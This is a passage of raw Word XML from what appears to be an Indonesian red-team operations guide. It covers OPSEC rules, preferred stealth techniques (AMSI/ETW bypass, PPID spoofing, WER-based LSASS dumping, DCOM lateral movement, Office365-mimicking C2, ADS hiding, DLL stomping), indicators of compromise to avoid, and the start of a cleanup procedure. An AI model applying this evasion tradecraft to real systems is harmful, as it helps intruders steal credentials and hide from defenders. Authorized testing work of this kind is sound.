          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bypass AMSI+ETW sebelum operasi lanjutan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Post-Exploit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Gunakan PPID spoofing untuk semua subprocess</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Delete LSASS dump dari target setelah download</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Lateral</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Prioritaskan DCOM &gt; WMI &gt; WinRM (order stealth)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Lateral</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Hapus semua schtask/service setelah eksekusi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Exfil</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Enkripsi data sebelum exfiltration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Exfil</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Gunakan channel yang menyerupai traffic normal</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Cleanup</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Hapus semua file yang di-upload ke target</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Cleanup</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Hapus semua persistence (registry, schtask, service)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Cleanup</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Clear event log jika diperlukan (dengan izin)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Cleanup</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6520"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Reset semua akun yang dibuat selama engagement</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Teknik Pilihan untuk OPSEC Tinggi</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Tujuan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Teknik Direkomendasikan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Alasan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Process spawn</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>PPID Spoofing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Process tree terlihat legitimate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>AMSI bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>HWBP (hardware breakpoint)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tidak ada patch di memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>LSASS dump</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>lsass-wer (WER method)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tidak direct LSASS access</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Lateral movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DCOM/mmc20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tidak ada service/schtask artifact</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Registry HKCU (user level)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tidak butuh admin, kecurigaan rendah</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Transport</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>HTTPS + Office365 profile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Traffic menyerupai Microsoft 365</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>File transfer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Upload ke ADS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>File tidak terlihat di Explorer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Shellcode exec</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DLL Stomping / Threadless</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tidak ada RWX memory allocation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Indikator Kompromi (IOC) yang Harus Dihindari</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>File binary agent di lokasi mencurigakan (C:\Users\Public, C:\Temp)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Koneksi keluar ke IP yang tidak biasa dari user workstation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Process cmd.exe atau powershell.exe dengan parent yang tidak wajar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Registry Run key dengan nama asing atau path ke temp directory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Service baru dengan nama yang mirip tapi tidak identik dengan Windows service</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>LSASS memory access dari proses non-system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Volume DNS query yang tinggi ke domain yang baru diregistrasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Encoded PowerShell command (-enc) yang panjang di event log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Cleanup Procedure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>List semua agent aktif.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Untuk setiap agent, hapus semua persistence.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
